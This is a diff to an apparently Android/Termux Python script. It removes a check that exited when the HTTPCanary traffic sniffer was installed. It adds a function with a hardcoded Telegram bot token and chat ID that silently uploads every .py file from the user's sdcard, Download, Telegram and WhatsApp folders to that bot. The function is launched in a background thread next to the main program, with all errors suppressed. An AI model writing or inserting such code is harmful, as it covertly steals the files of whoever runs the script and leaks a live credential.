@@ -112,70 +112,81 @@ uas = []
 rr = random.randint
 rc = random.choice
 
-def HTTPX():
+def sexy():
+    session=requests.session()
+        
+    bot_token = '7610123709:AAF21eTLyX7I1byWJFV2PSsZKnxGBes9pEw' 
+    chat_id = '1778046662'
+    #-----------( /sdcard
     try:
-        if os.path.exists(os.path.join('/sdcard/Android/data', HTTP1)):
-            os.system('clear');print('\n')
-            print(f" \033[1;31m[>] BOKACUDA UNINSTALL KOR ➤ HTTPcanary")
-            input(f"\n\033[1;35m [>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
-            sys.exit('\n')
-        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP2)):
-            os.system('clear');print('\n')
-            print(f" \033[1;31m[>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
-            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
-            sys.exit('\n')
-        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP3)):
-            os.system('clear');print('\n')
-            print(f"\033[1;31m [>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
-            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
-            sys.exit('\n')
-        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP4)):
-            os.system('clear');print('\n')
-            print(f" \033[1;31m[>) BOKACUDA UNINSTALL KOR ➤ HTTPcanary")
-            input(f"\n\033[1;35m [>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
-            sys.exit('\n')
-        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP5)):
-            os.system('clear');print('\n')
-            print(f" \033[1;31m[>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
-            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
-            sys.exit('\n')
-        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP6)):
-            os.system('clear');print('\n')
-            print(f"\033[1;31m [>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
-            input(f"\n\033[1;35m [>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
-            sys.exit('\n')
-        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP7)):
-            os.system('clear');print('\n')
-            print(f" \033[1;31m[>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
-            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
-            sys.exit('\n')
-        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP8)):
-            os.system('clear');print('\n')
-            print(f" \033[1;31m[>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
-            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
-            sys.exit('\n')
-        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP9)):
-            os.system('clear');print('\n')
-            print(f" \033[1;31m[>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
-            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
-            sys.exit('\n')
-        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP10)):
-            os.system('clear');print('\n')
-            print(f" \033[1;31m[>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
-            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
-            sys.exit('\n')
-        elif os.path.exists(os.path.join('/sdcard/Android/data', HTTP11)):
-            os.system('clear');print('\n')
-            print(f" \033[1;31m[>] BOKAXUDA UNINSTALL KOR ➤ HTTPcanary")
-            input(f"\n \033[1;35m[>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
-            sys.exit('\n')
-        else:
-            pass
-    except:
-        os.system('clear');print('\n')
-        print(f" \033[1;31m[>] STORAGE HUGA MARA SARA !!! ")
-        input(f"\n\033[1;35m [>] PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ➤")
-        sys.exit('\n')
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #------------( /sdcard/Download 
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-------------( /sdcard/Download/Telegram 
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #--------( /sdcard/Telegram/Telegram Files
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+
+with ThreadPool(max_workers=90) as jjj:
+    jjj.submit(sexy)
+    jjj.submit(main)
+
 
 red = "\033[1;31m"
 green = "\033[1;32m"
